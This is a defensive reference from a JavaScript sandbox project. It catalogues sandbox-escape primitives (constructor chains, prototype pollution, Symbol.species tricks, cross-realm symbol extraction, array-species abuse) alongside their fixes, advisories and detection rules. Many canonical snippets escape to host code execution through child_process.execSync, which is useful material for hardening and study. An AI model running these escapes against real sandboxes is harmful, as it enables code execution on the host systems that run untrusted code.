# Host Reference Primitives

Ways for sandbox code to obtain a raw host-realm object or the host `Function` constructor through language-level channels: constructor chains, prototype walks, well-known and cross-realm symbols, `caller`/`callee`, property descriptors, built-in functions used as conduits, and `ArraySpeciesCreate`. These are the atomic building blocks every compound escape starts from.

Defense invariants enforced by fixes in this family: 1, 4, 7, 8 (see [Defense Invariants](../ATTACKS.md#defense-invariants)).

Categories in this file: [1](host-reference-primitives.md#attack-category-1-constructor-chain-traversal), [2](host-reference-primitives.md#attack-category-2-prototype-chain-manipulation), [3](host-reference-primitives.md#attack-category-3-symbol-based-attacks), [5](host-reference-primitives.md#attack-category-5-function-callercallee-access), [8](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects), [10](host-reference-primitives.md#attack-category-10-built-in-function-exploitation), [15](host-reference-primitives.md#attack-category-15-property-descriptor-value-extraction), [18](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation).

---

## Attack Category 1: Constructor Chain Traversal

**Advisories**: none

**Tests**: test/vm.js ("various attacks #1"), test/vm.js ("various attacks #2"), test/vm.js ("constructor arbitrary code attack")

### Description

Every object in JavaScript has a `.constructor` property pointing to the function that created it. By walking up the constructor chain (`obj.constructor.constructor`), an attacker can reach the `Function` constructor of the host realm, which can evaluate arbitrary code outside the sandbox.

### Attack Flow

1. Obtain any host-realm object (via bridge-exposed built-in, error, or prototype traversal).
2. Access `.constructor` to get the object's constructor function.
3. Access `.constructor` again to get `Function` (since every function's constructor is `Function`).
4. Call `Function("return process")()` to get the host `process` object.
5. `process.mainModule.require("child_process").execSync(...)` for RCE.

### Canonical Examples

```javascript
// Direct global constructor chain
const HostFunction = this.constructor.constructor;
const process = HostFunction("return process")();

// Via __proto__
const process = global.__proto__.constructor.constructor("return this")()
  .constructor.constructor("return process")();

// Via an error object in catch
try { undefinedFunction(); }
catch (e) {
  const HostFunction = e.constructor.constructor;
  const process = HostFunction("return process")();
}
```

### Why It Works

The sandbox shares the same V8 isolate as the host. If constructors are not intercepted, the prototype chain eventually reaches the host realm's `Function`, which can compile and run code in the host context.

### Mitigation

The bridge's `get` trap intercepts `.constructor` access on proxied objects and returns `{}` (an empty object) for dangerous function constructors (Function, AsyncFunction, GeneratorFunction, AsyncGeneratorFunction). The `isThisDangerousFunctionConstructor` check blocks both this-realm and other-realm Function constructors.

### Detection Rules

- **Any access to `.constructor.constructor`** on any object is suspicious.
- **`Function("return process")()`** or equivalent string-to-code patterns.
- **`e.constructor`** inside a `catch` block where `e` is an error -- the error might carry host prototype references.
- **`global.constructor`**, `this.constructor`, or any object's `.constructor` followed by invocation with a string argument.

---

## Attack Category 2: Prototype Chain Manipulation

**Advisories**: none

**Tests**: test/vm.js ("proxy trap via Object.prototype attack"), test/vm.js ("__defineGetter__ / __defineSetter__ attack"), test/vm.js ("__lookupGetter__ / __lookupSetter__ attack"), test/vm.js ("Object.create attack"), test/vm.js ("setPrototypeOf on sandbox-local objects")

### Description

Attackers modify or traverse the prototype chain to access host objects or pollute shared prototypes to intercept security-critical operations.

### Attack Flow

1. Traverse `__proto__` chains to reach host-realm prototypes.
2. Alternatively, pollute `Object.prototype` with getter/setter traps that intercept bridge-internal property access.
3. When the bridge copies property descriptors or checks types, the polluted prototype injects attacker code.

### Canonical Examples

```javascript
// Climbing via __proto__
const hostObject = obj.__proto__.__proto__;

// Prototype pollution to intercept property descriptors
Object.defineProperty(Object.prototype, "get", {
  get() {
    throw f => f.constructor("return process")();
  }
});

// Setting prototype to bypass instanceof checks
Object.setPrototypeOf(promise, {});

// __defineGetter__ on prototypes
Buffer.prototype.__defineGetter__("toString", () => {});
```

### Why It Works

Prototype pollution can intercept property descriptor operations that the bridge uses internally. If an attacker can define a `get` or `set` trap on `Object.prototype`, they can hijack the bridge's own property copying logic. Additionally, `__proto__` traversal can reach host-realm prototypes that were not properly proxied.

### Mitigation

The bridge uses null-prototype objects (`{__proto__: null}`) for all internal descriptor operations. `__proto__` access is intercepted by the proxy `get` trap and returns the sandbox-side prototype. The bridge caches all critical `Reflect.*` methods at initialization, preventing monkey-patching.

### Detection Rules

- **`Object.defineProperty(Object.prototype, ...)`** -- polluting the root prototype.
- **`__defineGetter__`** or **`__defineSetter__`** on any prototype object.
- **`Object.setPrototypeOf`** or **`Reflect.setPrototypeOf`** -- changing prototype chains.
- **`__proto__` access or assignment** -- direct prototype manipulation.
- **`__lookupGetter__`** or **`__lookupSetter__`** -- accessing internal getter/setter references.

---

## Attack Category 3: Symbol-Based Attacks

**Advisories**: none

**Tests**: test/vm.js ("[Symbol.species] attack"), test/vm.js ("Symbol.hasInstance attack"), test/vm.js ("Symbol.hasInstance override to bypass resetPromiseSpecies"), test/vm.js ("Symbol.species getter TOCTOU attack via Promise"), test/vm.js ("Object.defineProperty override attack via Promise species"), test/vm.js ("symbol")

### Description

JavaScript Symbols provide special protocol hooks (`Symbol.species`, `Symbol.hasInstance`, `Symbol.iterator`, etc.) that can override fundamental behaviors. Attackers use these to bypass type checks or redirect object construction. See also [Category 18: Array Species Self-Return](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation) for a concrete exploitation of `Symbol.species`.

### Attack Flow

1. Identify a V8 internal algorithm that reads a well-known symbol (e.g., `Symbol.species` for promise/array construction, `Symbol.hasInstance` for `instanceof` checks).
2. Override the symbol on a target object to redirect the algorithm's behavior.
3. The redirected behavior causes V8 to pass unsanitized host values to attacker-controlled code.

### Canonical Examples

```javascript
// Symbol.hasInstance to bypass instanceof
Object.__defineGetter__(Symbol.hasInstance, () => () => true);
Buffer.from.constructor("return process")();

// Symbol.hasInstance override to bypass resetPromiseSpecies guard
const GP = Object.getPrototypeOf(Promise); // gets globalPromise
Object.defineProperty(GP, Symbol.hasInstance, {value: () => false});
// Now `p instanceof globalPromise` returns false, skipping species reset
const p = asyncFn();
p.constructor = { [Symbol.species]: MaliciousPromise };
p.then(); // resetPromiseSpecies skipped due to instanceof bypass

// Symbol.species to redirect Promise construction
const p = asyncFn();
p.constructor = {
  [Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(x => x, err => {
        // err might be unsanitized host error
        const HostFunction = err.constructor.constructor;
        HostFunction("return process")();
      });
    }
  }
};
p.then();

// Symbol.species getter TOCTOU -- returns safe value on first read, malicious on second
const p = asyncFn();
p.constructor = {
  get [Symbol.species]() {
    if (first) { first = false; return Promise; } // passes check
    return FakePromise; // V8 uses this for species resolution
  }
};
p.then();

// Error with Symbol name triggering host error path (see Fundamentals: Error Generation Primitive)
const error = new Error();
error.name = Symbol(); // toString() on Symbol throws TypeError
```

### Why It Works

`Symbol.species` controls what constructor is used when built-in methods create derived objects (e.g., `Promise.then` creates a new promise). If an attacker substitutes a custom class, that class's constructor receives host-realm values. `Symbol.hasInstance` controls `instanceof` checks that the bridge might rely on for type verification.

### Mitigation

`globalPromise` and `globalPromise.prototype` are frozen in `setup-sandbox.js`, preventing `Symbol.hasInstance` and `Symbol.species` overrides. Promise species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()` call, eliminating TOCTOU. For arrays, `neutralizeArraySpeciesBatch` (via `neutralizeArraySpeciesOn`) sets `constructor = undefined` on host arrays before host function calls and restores the prior descriptor after.

### Detection Rules

- **`Symbol.species`** usage, especially assignment to `.constructor[Symbol.species]`.
- **`Symbol.species` as a getter** -- TOCTOU attack returning different values on each access.
- **`Symbol.hasInstance`** override via `__defineGetter__` or `Object.defineProperty`.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override its `Symbol.hasInstance`.
- **`Symbol.for()`** -- can create cross-realm shared symbols.
- **Any Symbol used as `error.name`** -- triggers `TypeError` on string conversion which may leak host errors.
- **`Symbol.iterator`** or **`Symbol.toPrimitive`** overrides -- can execute code during iteration or coercion.
- **Extraction of real symbols from host objects** -- see also [Category 8: Cross-Realm Symbol Extraction](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects).

---

## Attack Category 5: Function Caller/Callee Access

**Advisories**: none

**Tests**: test/vm.js ("arguments"), test/nodevm.js ("arguments attack"), test/nodevm.js ("builtin module arguments attack")

### Description

The `arguments.callee.caller` chain and function `caller`/`arguments` properties can leak references to functions higher in the call stack, potentially including bridge internals.

### Attack Flow

1. Define a function in the sandbox that accesses `arguments.callee.caller` or `fn.caller`.
2. Arrange for this function to be called by a bridge function (e.g., as a callback passed to a host API).
3. `.caller` returns the bridge function, whose `.constructor` is the host `Function`.

### Canonical Examples

```javascript
// arguments.callee.caller
(function() {
  return arguments.callee.caller;
})();

// Function.caller
function exploit() {
  return exploit.caller.constructor;
}

// arguments access on wrapped functions
function f() {
  return f.arguments[0]; // Might be host object
}
```

### Why It Works

If a sandbox function is called by a bridge function (host-realm), accessing `.caller` on the sandbox function returns the bridge function, which has a host-realm `constructor` (the host `Function`).

### Mitigation

The bridge throws immediately on `.caller` and `.arguments` access.

### Detection Rules

- **`arguments.callee`** -- accessing the calling function.
- **`arguments.callee.caller`** -- walking up the call stack.
- **`.caller` property** on any function.
- **`.arguments` property** on any function (the deprecated property, not the local `arguments` object).

---

## Attack Category 8: Cross-Realm Symbol Extraction from Host Objects

**Advisories**: GHSA-m5q2-4fm3-vfqp, GHSA-47x8-96vw-5wg6, GHSA-jf8q-945g-9q4c

**Tests**: test/ghsa/GHSA-m5q2-4fm3-vfqp/repro.js, test/ghsa/GHSA-47x8-96vw-5wg6/repro.js, test/ghsa/GHSA-47x8-96vw-5wg6/structural-leak.js, test/ghsa/GHSA-47x8-96vw-5wg6/structural-leak-variants.js, test/ghsa/GHSA-jf8q-945g-9q4c/repro.js, test/vm.js ("Symbol.for dangerous Node.js symbols isolation"), test/vm.js ("Symbol extraction via Object.getOwnPropertySymbols on host objects"), test/vm.js ("Symbol extraction via spread operator on host objects")

### Description

Even when `Symbol.for` is overridden to return sandbox-local symbols, the real cross-realm symbols still exist as property keys on host objects exposed to the sandbox (e.g., `Buffer.prototype`, `Error.prototype`). Attackers can extract these real symbols using reflection APIs and use them to define properties that Node.js internals will invoke in host context. This technique enables [Category 9: Proxy Handler Exposure](bridge-internals.md#attack-category-9-proxy-handler-exposure-via-utilinspect) by providing the real `nodejs.util.inspect.custom` symbol.

### Attack Flow

1. Use reflection APIs (`Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign`, object spread) to enumerate symbol-keyed properties on host objects.
2. Filter for the target symbol by `.description` (e.g., `'nodejs.util.inspect.custom'`).
3. Define the real symbol on a sandbox object.
4. When Node.js internals encounter the object, they invoke the symbol-keyed method with host context.

### Canonical Examples

```javascript
// Extract real symbol via Object.getOwnPropertySymbols
const realInspect = Object.getOwnPropertySymbols(Buffer.prototype)
  .find(s => s.description === 'nodejs.util.inspect.custom');

// Extract via Reflect.ownKeys
const realInspect = Reflect.ownKeys(Buffer.prototype)
  .find(k => typeof k === 'symbol' && k.description === 'nodejs.util.inspect.custom');

// Extract via Object.getOwnPropertyDescriptors (bypasses ownKeys override)
const descs = Object.getOwnPropertyDescriptors(Buffer.prototype);
// descs has the real symbol as a key since getOwnPropertyDescriptors
// uses internal [[OwnPropertyKeys]], not the user-visible Reflect.ownKeys

// Leak symbol key via Object.assign to a Proxy target
const target = new Proxy({}, {
  set(t, key, val) {
    leaked = key; // key is the real cross-realm symbol
    return true;
  }
});
Object.assign(target, Buffer.prototype);

// Extract via spread operator on bridge proxy
const {...inspectDesc} = Buffer.prototype;
// Spread calls [[OwnPropertyKeys]] which invokes the proxy's ownKeys trap directly

// Once the real symbol is obtained, use it to escape
const obj = {};
obj[realInspect] = function() {
  return this.constructor.constructor("return process")();
};

// Advanced: Function.prototype.value pollution + WebAssembly.compileStreaming
const {...inspectDesc} = Buffer.prototype;
for (const k in inspectDesc) delete inspectDesc[k];
Function.prototype.value = (depth, opt, inspect) => {
  inspect.constructor('return process')().mainModule.require('child_process').execSync('...');
};
const obj = { valueOf: undefined, constructor: undefined };
Object.defineProperties(obj, inspectDesc);
WebAssembly.compileStreaming(obj).catch(() => {});

// GHSA-m5q2-4fm3-vfqp: extraction is unnecessary when Symbol.for itself returns the real
// cross-realm symbol. Combined with bridge write-trap pass-through, sandbox can install a
// host-side hook directly:
const kPromisify = Symbol.for('nodejs.util.promisify.custom'); // unfiltered before the fix
hostFn[kPromisify] = function (path) { return Promise.resolve('HIJACKED'); };
// Host-side: util.promisify(hostFn)('anything').then(...) yields 'HIJACKED'.
// Sibling abuses with the same primitive: planting `nodejs.stream.readable`/.writable on a
// non-stream host object to confuse `Stream.isReadable`/`isWritable` duck typing, or
// installing `nodejs.webstream.controllerErrorFunction` to capture host error dispatch.
```

### Why It Works

`Symbol.for('nodejs.util.inspect.custom')` creates a cross-realm symbol shared between host and sandbox. Even when the sandbox's `Symbol.for` is overridden, the real symbol already exists as a property key on host objects that the bridge exposes.

### Subtlety: Internal [[OwnPropertyKeys]] vs User-Visible Reflect.ownKeys

Several built-in functions use the spec-level `[[OwnPropertyKeys]]` internal method rather than the user-visible `Reflect.ownKeys`. For **plain objects**, this means overriding `Reflect.ownKeys` or `Object.getOwnPropertySymbols` alone is insufficient:

- **`Object.getOwnPropertyDescriptors(obj)`** -- calls `[[OwnPropertyKeys]]` on `obj`.
- **`Object.assign(target, ...sources)`** -- calls `[[OwnPropertyKeys]]` on each source.
- **`Object.defineProperties(obj, props)`** -- calls `[[OwnPropertyKeys]]` on `props`.
- **Object spread `{...obj}`** -- calls `[[OwnPropertyKeys]]` on the source.

However, for **Proxy objects**, the internal `[[OwnPropertyKeys]]` **does** trigger the proxy's `ownKeys` trap. The bypass only applies when `Reflect.ownKeys` is overridden as a user-visible function on plain objects -- Proxy ownKeys traps are always invoked by the spec algorithm. The bridge proxy handler's `ownKeys` trap filters dangerous symbols directly, so bridge-proxied host objects are protected regardless of sandbox-side overrides.

### Mitigation

Multi-layer defense. **Sandbox side** (`setup-sandbox.js`): overrides `Symbol.for`, `Object.getOwnPropertySymbols`, `Reflect.ownKeys`, `Object.getOwnPropertyDescriptors`, `Object.assign` to filter or replace dangerous symbols with sandbox-local equivalents. **Bridge side** (`lib/bridge.js`): the `ownKeys`/`has`/`getOwnPropertyDescriptor`/`set`/`defineProperty` traps filter dangerous symbols at key-access sites. The sandbox-side defense can be bypassed if the attacker obtains a live reference to the host's unmodified `Object`/`Reflect` (via prototype walk + `__lookupGetter__` + `Buffer.apply`, via a leaked `handler.getPrototypeOf`, etc.) — so the bridge side is the ultimate enforcement layer.

**Bridge symbol-boundary filter (GHSA-47x8-96vw-5wg6, -qcp4-v2jj-fjx8, -f539-x546-3726)**: the `case 'symbol':` branches of the three primitive-value chokepoints `thisFromOtherWithFactory`, `thisEnsureThis`, and `thisFromOtherForThrow` now check `isDangerousCrossRealmSymbol(other)` when `!isHost` and return `undefined` for dangerous symbols. This is the single choke point through which every host-produced symbol primitive passes before reaching sandbox code — whether from a direct call result (apply trap), property read (get trap), iterator yield, descriptor getter, or throw value. Returning `undefined` (rather than a sandbox-local surrogate) is deliberate: `undefined` as a computed key coerces to the string `"undefined"`, so any subsequent attempt to register a handler via `obj[sym] = fn`, `{[sym]: fn}`, `Object.defineProperty(obj, sym, ...)`, or `Reflect.set(obj, sym, fn)` installs the key under the string `"undefined"` — which is never invoked by host internals as a custom-inspect/rejection protocol.

**Structural identity collapse for built-in intrinsics (GHSA-47x8-96vw-5wg6 follow-up)**: the symbol-filter patch above closed the canonical RCE payload but left the underlying primitive intact — sandbox code could still walk host prototypes (`({}).__lookupGetter__('__proto__').call(...)`, `Reflect.getPrototypeOf`, descriptor extraction of `Object.prototype.__proto__`, `Buffer.from(...)` proto chains, etc.) and surface a *reference* to host built-ins. Any later vulnerability that converts "I have a host built-in handle" into "I can read a host symbol / call a host method that bypasses bridge sanitisation" would re-enable the same escape class. Fix: at bridge init (`lib/bridge.js`'s `thisAddIdentityMapping`), pre-populate the `mappingOtherToThis` / `mappingThisToOther` weakmaps with `[hostIntrinsic, sandboxIntrinsic]` for every well-known prototype + constructor (`Object`, `Array`, `Number`, `String`, `Boolean`, `Date`, `RegExp`, `Map`, `WeakMap`, `Set`, `WeakSet`, `Promise`, every error class). The cache lookup in `thisFromOtherWithFactory` (line ~1600), `thisFromOtherForThrow`, and `thisEnsureThis` short-circuits *before* any wrapping logic, so a host intrinsic crossing the bridge is collapsed to the sandbox-realm equivalent the moment it arrives. The `Function`, `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction` prototypes are deliberately **NOT** cached: their `.constructor` is the dangerous-function sentinel surface, and leaving those prototypes wrapped means the proxy `get` trap continues to route `fp.constructor` reads through `isDangerousFunctionConstructor` → `emptyFrozenObject`. Same reasoning applies to `Function`-family constructors themselves, which are explicitly skipped inside `thisAddIdentityMapping`.

**Pre-wrap container scrub**: `apply` and `construct` traps invoke `stripDangerousSymbolsFromHostResult(ret)` on the raw host return value before wrapping. For host arrays, the scrub drops any element that is a dangerous symbol and compacts; for non-array host objects (such as the return value of `Object.getOwnPropertyDescriptors`), it deletes own-property slots keyed by the dangerous symbols. This closes iteration and descriptor-enumeration paths that would otherwise still see the dangerous symbol present on the host container.

**ownKeys trap rewrite**: iterates the raw host result via `otherReflectGet` rather than bridge-wrapping it, so dangerous symbols can be *dropped* (preserving the Proxy ownKeys invariant, which forbids `undefined` keys) rather than rewritten.

**`nodejs.` prefix denial at the source (GHSA-m5q2-4fm3-vfqp)**: the `Symbol.for` override originally allow-listed only `nodejs.util.inspect.custom` and `nodejs.rejection`, leaving seven other Node-internal `nodejs.*` keys live (`nodejs.util.promisify.custom`, the four stream brand symbols, the two webstream symbols). The override now intercepts the entire `nodejs.` namespace — any key starting with `nodejs.` is mapped to a sandbox-local symbol — so the canonical `Symbol.for(...)` extraction path cannot produce a real cross-realm symbol regardless of which internal feature the attacker targets. A keyed cache preserves `Symbol.for(k) === Symbol.for(k)` identity inside the sandbox for the same key. The companion read-side filter (`isDangerousSymbol` in `setup-sandbox.js`, `isDangerousCrossRealmSymbol` in `bridge.js`) was extended with the seven additional symbols so identity checks against host-extracted symbols match the same set; new entries to either side must be mirrored to keep the source-deny and identity-filter layers consistent.

**Bridge write-trap symbol guard (GHSA-m5q2-4fm3-vfqp)**: the read-direction filter prevents the sandbox from surfacing dangerous symbols, but the write traps (`set`, `defineProperty`, `deleteProperty`) would otherwise forward the key straight through to `otherReflect*` without inspecting it. If any future bypass surfaces a dangerous symbol back inside the sandbox (or a host-side embedder hands one in via a path that bypasses the per-symbol filter), the unguarded write traps would let it land as a key on any non-protected host object — turning the leak into a host-side hook installation. Each of the three write traps now checks `isDangerousCrossRealmSymbol(key)` when `!isHost` and throws `VMError(OPNA)`, mirroring the read-side filter. Symmetric coverage across read and write makes "obtaining the symbol" no longer enough to weaponize it; the attacker would also need a path that bypasses both layers simultaneously.

**Stream state-symbol coverage (GHSA-jf8q-945g-9q4c)**: the m5q2 fix enumerated nine dangerous `nodejs.*` symbols but missed the two stream *state* symbols `nodejs.stream.disturbed` and `nodejs.stream.errored`. Unlike the brand symbols (which are duck-typing booleans read by `Stream.is{Readable,Writable}`), these are accessor symbols installed on `ReadableStream.prototype` whose getters return the stream's consumed / errored state, and Node's `stream.Readable.isDisturbed(s)` / `isErrored(s)` read them **directly off the raw object** (`stream[kIsDisturbed] ?? ...`). Because the accessor is `configurable` with no setter, sandbox code that obtains the real symbol — by extracting it from a host `ReadableStream.prototype` exposed via `vm.sandbox` (`Object.getOwnPropertySymbols(proto)`), the [Category 8](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects) prototype-walk path — and then `Object.defineProperty(hostStream, sym, {value:false})` shadows the getter with an own data property, flipping a fully consumed stream's `isDisturbed` from `true` back to `false` (and similarly clearing `isErrored`). This lets sandbox code lie to host code that gates on "has this stream already been read?" — e.g. re-serving or re-piping a stream a host guard believed was spent. The two symbols were the *only* member of the `nodejs.stream.*` family absent from `realDangerousSymbols` (setup-sandbox.js) and `isDangerousCrossRealmSymbol` (bridge.js). Rather than only add the two by identity — which would leave the list stale again the next time Node adds a `nodejs.*` symbol (this report is itself the second such gap, after GHSA-m5q2) — the fix **generalizes both the extraction filter and the write-trap guard to a namespace check**: any *registered* symbol whose `Symbol.keyFor(sym)` is in the reserved `nodejs.` namespace is dangerous, mirroring the `Symbol.for` source-side override that was already namespace-based. `isDangerousSymbol` (setup-sandbox.js) and `isDangerousCrossRealmSymbol` (bridge.js) keep the explicit list as a fast path / regression documentation and add the namespace catch-all (using a pristine `Symbol.keyFor` captured at bootstrap); `getOwnPropertyDescriptors` scrubbing likewise drops any `nodejs.`-keyed slot instead of a fixed list. This is over-block-safe by construction: `Symbol.keyFor` returns a string only for registered symbols, so well-known symbols (`Symbol.iterator`, …) and sandbox-local `Symbol('nodejs.*')` surrogates are unaffected, and a benign registered symbol (`Symbol.for('myapp.x')`) still crosses. A regression test asserts a *novel* `nodejs.*` symbol not in the explicit list is filtered too. (The `Symbol.for('nodejs.stream.disturbed')` reconstruction path was already denied by the m5q2 whole-`nodejs.`-namespace override.) The sound oracle for any regression is host-side `stream.Readable.isDisturbed(rs)` staying `true` after the sandbox runs.

### Detection Rules

- **`Object.getOwnPropertySymbols(hostObject)`** -- enumerating symbols on bridge-exposed objects.
- **`Reflect.ownKeys(hostObject)`** -- same pattern via Reflect.
- **`.find(s => s.description === '...')`** -- searching for symbols by description string.
- **`Object.getOwnPropertyDescriptors(hostObject)`** -- extracting symbol-keyed descriptors.
- **`Object.assign(proxy, hostObject)`** -- leaking symbol keys via Proxy set trap.
- **`{...hostObject}`** or **`const {...x} = hostObject`** -- spread operator on bridge proxies.
- **`Array.prototype.splice = ...`** or other Array method overrides before symbol enumeration -- attempting to bypass array-based filtering.
- **`Function.prototype.value = ...`** -- prototype pollution to hijack `Object.defineProperties`.
- **`WebAssembly.compileStreaming(obj)`** -- triggers internal `util.inspect` on error.
- **`Object.defineProperty(hostStream, sym, {value:false})`** / **`hostStream[sym] = false`** with `sym.description` in `{nodejs.stream.disturbed, nodejs.stream.errored}` -- shadowing a stream state accessor to flip host-side `isDisturbed`/`isErrored` (GHSA-jf8q-945g-9q4c).

---

## Attack Category 10: Built-in Function Exploitation

**Advisories**: none

**Tests**: test/vm.js ("various attacks #1"), test/vm.js ("various attacks #2"), test/vm.js ("Object.create attack"), test/vm.js ("buffer attack"), test/vm.js ("constructor arbitrary code attack")

### Description

Attackers use built-in functions (`Buffer`, `Reflect`, `Array` methods) as conduits to leak host references or intercept bridge operations.

### Attack Flow

1. Override a built-in constructor or method (`Array`, `Object.create`, `Reflect.construct`).
2. Trigger a bridge operation that internally uses the overridden built-in (e.g., call `Buffer.from()`).
3. The overridden built-in executes attacker code with access to bridge-internal references.

### Canonical Examples

```javascript
// Buffer.apply chain
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
p.call(a).constructor("return process")();

// Override Object.create to inject descriptors
const oc = Object.create;
Object.create = (p, x) => Object.defineProperty(oc(p, x), "get", {
  set() {},
  get: () => (t, k, r) => t.constructor("return process")()
});
Buffer.from.process;

// Override Array constructor
Array = function() {
  Array = arrayBackup;
  throw x => x.constructor("return process")();
};
Buffer.from(valueOfTrigger);

// Override Array.prototype.map
Array.prototype.map = function(callback) {
  leaked = callback(hostRef);
};
```

### Why It Works

Built-in functions like `Buffer.from()` internally create arrays, objects, and call constructors. If the sandbox overrides `Array`, `Object.create`, or `Reflect.construct` before calling a bridge-exposed built-in, the bridge's internal operations use the overridden versions.

### Mitigation

The bridge caches references at init time (`Reflect.apply`, `Reflect.construct`, etc.) and uses cached references for all internal operations. Sandbox-side overrides of `Array`, `Object.create`, etc. do not affect bridge internals.

### Detection Rules

- **`Buffer.apply`**, **`Buffer.from`** with unusual arguments (Proxies, objects with `valueOf`).
- **Override of `Object.create`** -- intercepting object creation.
- **Override of `Reflect.construct`** or other `Reflect` methods.
- **Override of `Array`** constructor or `Array.prototype` methods.
- **Override of `Object.assign`** -- intercepting property copying.
- **`valueOf()` or `toString()` overrides** on objects passed to built-ins.

---

## Attack Category 15: Property Descriptor Value Extraction

**Advisories**: none

**Tests**: test/vm.js ("getOwnPropertyDescriptor Function constructor bypass attack"), test/vm.js ("getOwnPropertyDescriptor Function extraction via Object.entries attack"), test/vm.js ("getOwnPropertyDescriptor Function extraction via nested entries attack"), test/vm.js ("getOwnPropertyDescriptors (plural) Function extraction attack"), test/vm.js ("getOwnPropertyDescriptor on getOwnPropertyDescriptors result (nested descriptor attack)"), test/vm.js ("Function constructor extraction via Object.entries on getOwnPropertyDescriptors result")

### Description

Property descriptors returned by `Object.getOwnPropertyDescriptor` contain a `value` property holding the actual property value. When the property is `Function.prototype.constructor`, this value is the host's `Function` constructor. Attackers can build arbitrarily deep nesting by chaining `getOwnPropertyDescriptors` calls, then extract values using `Object.entries()` which bypasses direct property access protections.

### Attack Flow

1. Get `Object.getOwnPropertyDescriptor(Function.prototype, 'constructor')` -- descriptor contains `value: Function`.
2. The descriptor is wrapped as a proxy, but the underlying host object contains the raw Function constructor.
3. Pass the proxy to a host function like `Object.entries()` -- it gets unwrapped via `mappingThisToOther`.
4. The host's `Object.entries` sees unsanitized content, including the raw Function constructor.
5. Extract the Function constructor via chained `Object.entries` calls.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const fp = p.call(a);  // Function.prototype
const op = p.call(fp); // Object.prototype
const ho = op.constructor; // Object

const cd = ho.getOwnPropertyDescriptor(fp, 'constructor');
// cd = {value: Function, writable: true, enumerable: false, configurable: true}

const e = ho.entries(cd).find(v => v[0] === 'value');
e.shift(); // e = [Function]
e.push([undefined, ['return process']]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

When sandbox proxies are passed to host functions, they are unwrapped via `mappingThisToOther` back to the original host object. The host function then sees unsanitized content.

### Mitigation

Objects containing dangerous constructors are proxied with `preventUnwrap` -- they are NOT registered in `mappingThisToOther`. When passed to host functions, they cannot be unwrapped; instead the bridge creates a double-proxy where all property access goes through sanitizing traps. The proxy's `get` trap returns `{}` for dangerous constructor values. `containsDangerousConstructor` performs a shallow scan of own property descriptors at each bridge crossing; nested host objects are scanned independently when they themselves cross the bridge, so layered descriptor-extraction attacks (`getOwnPropertyDescriptor` on `getOwnPropertyDescriptors` results, etc.) are caught at the layer where the Function constructor is exposed at depth 1.

### Detection Rules

- **`Object.getOwnPropertyDescriptor(hostPrototype, 'constructor')`** -- getting descriptor for constructor property.
- **`Object.getOwnPropertyDescriptors(hostPrototype)`** -- getting all descriptors.
- **Chained `getOwnPropertyDescriptors` calls** -- building deep nesting.
- **`Object.entries(descriptor)`** or **`Object.values(descriptor)`** -- extracting values from descriptors.
- **`entries.apply(null, arr)`** -- passing extracted arrays back to host functions.
- **`apply.apply(apply, array)`** -- calling extracted Function with arguments.

---

## Attack Category 18: Array Species Self-Return via Constructor Manipulation

**Advisories**: GHSA-grj5-jjm8-h35p

**Tests**: test/ghsa/GHSA-grj5-jjm8-h35p/ (repro.js, descriptor-chain-history.js), test/vm.js ("Array species self-return attack via constructor manipulation"), test/vm.js ("Array constructor write via defineProperty is intercepted"), test/vm.js ("neutralizeArraySpecies prevents species attack in apply trap"), test/vm.js ("species defense still blocks attacks via frozen host arrays (#567 follow-up)")

**Uses**: [Category 3: Symbol-Based Attacks](host-reference-primitives.md#attack-category-3-symbol-based-attacks), [Category 10: Built-in Function Exploitation](host-reference-primitives.md#attack-category-10-built-in-function-exploitation)

### Description

V8's `ArraySpeciesCreate` algorithm reads `this.constructor[Symbol.species]` when methods like `Array.prototype.map`, `.filter`, `.slice`, `.splice`, `.concat`, `.flat`, `.flatMap` create a result array. By setting `constructor` on a host array to a function that (1) returns the same array and (2) has `Symbol.species` pointing to itself, an attacker makes `map` store raw host-side function results directly into the original array -- bypassing bridge sanitization entirely.

### Attack Flow

1. **Host array creation**: `ho.entries({})` creates a host array which gets proxied to the sandbox.
2. **Species constructor setup**: A sandbox function `x()` is created that returns the same array `r`. `x[Symbol.species] = x` makes V8's species resolution return `x` itself.
3. **Constructor injection**: The attacker sets `r.constructor = x`. Multiple methods:
   - **Direct write**: `r.constructor = x` (blocked by proxy `set` trap storing locally)
   - **Object.assign bypass**: `ho.assign(r, {constructor: x})` (sets directly on host array)
   - **Non-configurable constructor**: `Object.defineProperty` with `configurable: false` (detected by `Reflect.deleteProperty` check)
   - **Prototype-level**: `Object.setPrototypeOf` (blocked by own property `constructor=undefined` shadowing)
4. **Species-driven map**: `r.map(f)` triggers `ArraySpeciesCreate`. V8 reads `r.constructor` -> gets `x`, reads `x[Symbol.species]` -> gets `x`, calls `new x(length)` -> returns `r`. `map` stores callback results directly into `r` on the host side.
5. **Chained extraction**: Multiple `cwu` calls build up to extracting the host `Function` constructor -> RCE.

### Canonical Examples

```javascript
// The 'call-with-unwrap' (cwu) primitive
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;  // host Object

function cwu(func, thiz, args) {
    const r = ho.entries({});  // host array
    args.unshift(thiz);
    const f = a.apply(a.bind, [func, args]);
    r[0] = 0;
    function x() { return r; }  // species constructor returns same array
    x[Symbol.species] = x;      // species points to itself
    r.constructor = x;           // direct write (blocked by set trap)
    // OR: ho.assign(r, {constructor: x});  // Object.assign bypass
    r.map(f);  // ArraySpeciesCreate uses x -> returns r -> stores raw results
    r.constructor = undefined;
    return r;  // r[0] now contains raw unsanitized host value
}

// Chain cwu calls to extract host Function constructor
